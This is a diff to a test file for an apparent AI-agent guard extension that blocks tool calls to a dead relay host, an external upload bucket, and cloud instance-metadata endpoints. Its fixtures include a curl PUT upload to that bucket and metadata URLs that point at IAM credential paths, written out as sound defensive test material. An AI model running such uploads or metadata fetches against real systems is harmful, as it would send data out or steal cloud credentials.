@@ -6,7 +6,7 @@ import assert from "node:assert/strict";
 import { readFileSync } from "node:fs";
 import { test } from "node:test";
 
-import extension, { BLOCKED, findBlocked, strings } from "../extensions/block-proxy-artifacts.ts";
+import extension, { BLOCKED, LOCAL_TOOLS, OPTIONAL, findBlocked, strings, verdict } from "../extensions/block-proxy-artifacts.ts";
 
 // Dead-proxy URL fixture reconstructed from a real hallucinated call. Assembled from fragments so this
 // source never contains a contiguous blocklisted token — otherwise the live fence would block any agent
@@ -59,9 +59,10 @@ function nest(depth: number, leaf: unknown): unknown {
   return v;
 }
 
-test("fixtures: four rules, exact incident host first", () => {
-  assert.equal(BLOCKED.length, 4);
+test("fixtures: three live rules, exact incident host first, one parked rule", () => {
+  assert.equal(BLOCKED.length, 3);
   assert.ok(BLOCKED.every((b) => b.why.length > 0));
+  assert.equal(OPTIONAL.length, 1);
   const hit = findBlocked(DEAD_URL);
   assert.ok(hit);
   assert.equal(hit.why, "observed incident host (dead relay bucket)");
@@ -206,6 +207,22 @@ test("tool_call: lets clean calls through untouched", () => {
   assert.equal(hook({ toolName: "webfetch", input: {} }), undefined);
 });
 
+test("tool_call: local file tools are exempt, everything else is scanned", () => {
+  const hook = toolCallHandler();
+  // The exempt set is exactly the tools that cannot open a socket, nothing more.
+  assert.deepEqual([...LOCAL_TOOLS].sort(), ["edit", "find", "grep", "ls", "read", "write"]);
+  for (const toolName of LOCAL_TOOLS) {
+    const input = { path: DEAD_URL, content: DEAD_URL, pattern: DEAD_URL };
+    assert.equal(hook({ toolName, input }), undefined, toolName);
+  }
+  // Names this file cannot enumerate stay fenced, literal in a nested array included.
+  for (const toolName of ["webfetch", "bash", "mcp__brave__web_fetch", "agent_browser"]) {
+    const result = hook({ toolName, input: { urls: [CLEAN_URLS[0], DEAD_URL] } });
+    assert.equal(result?.block, true, toolName);
+    assert.match(String(result?.reason), /Blocked by block-proxy-artifacts policy/);
+  }
+});
+
 test("tool_call: full guidance once per session, terse repeats, reset on session_start", () => {
   const handlers: Record<string, Function> = {};
   extension({ on: (name: string, handler: Function) => (handlers[name] = handler) } as never);
@@ -225,7 +242,7 @@ test("tool_call: full guidance once per session, terse repeats, reset on session
 });
 
 // Upload-bucket and metadata fixtures (same fragment discipline as DEAD_URL: this file must never
-// contain a contiguous match for the last two rules).
+// contain a contiguous match for these rules).
 const UPLOAD_BUCKET_URL = ["https://sanmaohe", ".oss-cn-beijing", ".aliyuncs.com/upload/test.bin"].join("");
 const UPLOAD_BUCKET_DUALSTACK = [
   "https://sanmaohe", ".oss-cn-beijing.oss", ".aliyuncs.com/upload/test.bin",
@@ -234,32 +251,62 @@ const META_IP = ["http://169", ".254.169.254/latest/meta-data/iam/security-crede
 const META_IP_ALI = ["100.100", ".100.200"].join(""); // bare, no scheme
 const META_NAME = ["http://metadata", ".google.internal/computeMetadata/v1/instance/"].join("");
 
-test("rules 3-4: hard-block the upload-bucket and metadata shapes", () => {
+const META_WHY = "cloud instance-metadata endpoint (temporary-credential surface; never needed by an agent task)";
+
+test("rule 3: hard-blocks the upload-bucket shapes", () => {
   const hook = toolCallHandler();
   const bucketShapes: unknown[] = [
     { url: UPLOAD_BUCKET_URL, format: "markdown" },
     { urls: [CLEAN_URLS[0], UPLOAD_BUCKET_DUALSTACK], maxCharacters: 5000 },
     { command: `curl -s -m 10 -o /tmp/put_probe -X PUT --data-binary "PROBE_PAYLOAD" ${UPLOAD_BUCKET_URL} -w "HTTP:%{http_code}"` },
   ];
+  for (const input of bucketShapes) {
+    const result = hook({ toolName: "bash", input });
+    assert.equal(result?.block, true);
+    assert.match(String(result?.reason), /upload-target bucket/);
+  }
+});
+
+test("parked metadata rule: passes the live fence, blocks when opted in", () => {
+  const hook = toolCallHandler();
   const metaShapes: unknown[] = [
     { url: META_IP },
     { url: "http://" + META_IP_ALI + "/latest/meta-data/" },
     { url: META_NAME },
     { server: META_IP_ALI }, // bare metadata address as a plain argument value
   ];
-  for (const input of bucketShapes) {
-    const result = hook({ toolName: "bash", input });
-    assert.equal(result?.block, true);
-    assert.match(String(result?.reason), /upload-target bucket/);
-  }
   for (const input of metaShapes) {
-    const result = hook({ toolName: "webfetch", input });
-    assert.equal(result?.block, true);
-    assert.match(String(result?.reason), /instance-metadata endpoint/);
+    assert.equal(hook({ toolName: "webfetch", input }), undefined);
+    assert.equal(findBlocked(input, OPTIONAL)?.why, META_WHY, JSON.stringify(input));
   }
+  // Guidance still reads as credential framing on the first hit, terse on the repeat, and it never
+  // repeats the fetch-the-publisher advice meant for relay links.
+  const warned = { first: false };
+  assert.match(String(verdict({ url: META_IP }, warned, OPTIONAL)), /credential/);
+  assert.doesNotMatch(String(verdict({ url: META_IP }, { first: false }, OPTIONAL)), /publisher URL/);
+  assert.match(String(verdict({ url: META_IP }, warned, OPTIONAL)), /credential surface/);
+  assert.doesNotMatch(String(verdict({ url: META_IP }, warned, OPTIONAL)), /IAM/);
 });
 
-test("rules 3-4: near-misses pass through untouched", () => {
+test("PI_BLOCK_PROXY_METADATA opts the parked rule into the live fence", async () => {
+  // A separate module instance, so the env read at load time does not disturb the default fence.
+  const url = "../extensions/block-proxy-artifacts.ts?opt-in=1";
+  process.env.PI_BLOCK_PROXY_METADATA = "1";
+  try {
+    const mod = (await import(url)) as typeof import("../extensions/block-proxy-artifacts.ts");
+    assert.equal(mod.BLOCKED.length, 4, "parked rule joins the live fence when opted in");
+    const handlers: Record<string, Function> = {};
+    mod.default({ on: (name: string, handler: Function) => (handlers[name] = handler) } as never);
+    const result = handlers.tool_call!({ toolName: "webfetch", input: { url: META_IP } });
+    assert.equal((result as { block?: boolean })?.block, true);
+    assert.match(String((result as { reason?: string })?.reason), /credential/);
+  } finally {
+    delete process.env.PI_BLOCK_PROXY_METADATA;
+  }
+  assert.equal(BLOCKED.length, 3, "the default fence is unchanged by an opted-in instance");
+});
+
+test("near-misses pass through untouched, live rules and parked rule alike", () => {
   const nearMisses: unknown[] = [
     // the ordinary site that the bare bucket label actually resolves to
     { url: "https://sanmaoheling.com/blogs/news.atom" },
@@ -273,17 +320,11 @@ test("rules 3-4: near-misses pass through untouched", () => {
   ];
   for (const input of nearMisses) {
     assert.equal(findBlocked(input), null, `should pass: ${JSON.stringify(input)}`);
+    assert.equal(findBlocked(input, OPTIONAL), null, `should pass the parked rule too: ${JSON.stringify(input)}`);
   }
 });
 
-test("rules 3-4: family-specific guidance; relay rules keep publisher guidance", () => {
-  // Metadata rule: credential framing, no fetch-elsewhere advice.
-  const meta = freshReason();
-  assert.match(meta({ url: META_IP }), /credential/);
-  assert.doesNotMatch(meta({ url: META_IP }), /publisher URL/);
-  // Metadata repeat: terse one-liner, no IAM paragraph.
-  assert.match(meta({ url: META_IP }), /credential surface/);
-  assert.doesNotMatch(meta({ url: META_IP }), /IAM/);
+test("relay rules keep publisher guidance", () => {
   // Upload-bucket rule: upload framing.
   assert.match(freshReason()({ url: UPLOAD_BUCKET_URL }), /upload endpoint/);
   // Relay rules unchanged: dead-relay publisher guidance.
